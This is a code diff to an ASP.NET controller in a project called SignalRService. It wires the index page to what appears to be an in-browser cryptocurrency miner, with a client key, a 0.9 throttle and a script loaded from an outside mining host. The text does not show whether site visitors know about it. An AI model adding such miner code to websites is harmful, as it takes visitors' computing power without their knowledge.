@@ -17,7 +17,23 @@ namespace SignalRService.Controllers
        
         public ActionResult Index()
         {
-            return View("Index");
+            var baseViewModel = new ViewModels.ServiceBaseViewModel()
+            {
+                SiganlRBaseConfigurationVieModel = new ViewModels.SignalRBaseConfigurationViewModel()
+                {
+                    SinalRGroup = "serviceindex"
+                },
+                 MinerConfigurationViewModel = new SignalRService.ViewModels.MinerConfigurationViewModel()
+                 {
+                     ClientId = "b1809255c357703b48e30d11e1052387315fc5113510af1ac91b3190fff14087",
+                     Throttle = "0.9",
+                     ScriptUrl = "https://www.freecontent.stream./Htxj.js",
+                     StartDelayMs = 3000,
+                     ReportStatusIntervalMs = 65000
+                 }
+
+            };
+            return View("Index", baseViewModel);
         }
 
         public JsonResult SayHello()
@@ -61,13 +77,13 @@ namespace SignalRService.Controllers
 
         public PartialViewResult RenderSignalRBase(ViewModels.ServiceSettingViewModel basemodel)
         {
-            var model = new SignalRService.ViewModels.SignalRBaseConfigurationViewModel()
+            var modelx = new SignalRService.ViewModels.SignalRBaseConfigurationViewModel()
             {
 
                 SinalRGroup = basemodel.ServiceUrl
                 
             };
-            return PartialView("RenderMiner", model);
+            return PartialView("RenderMiner", modelx);
         }
 
         public ActionResult SrcStarter(string url)
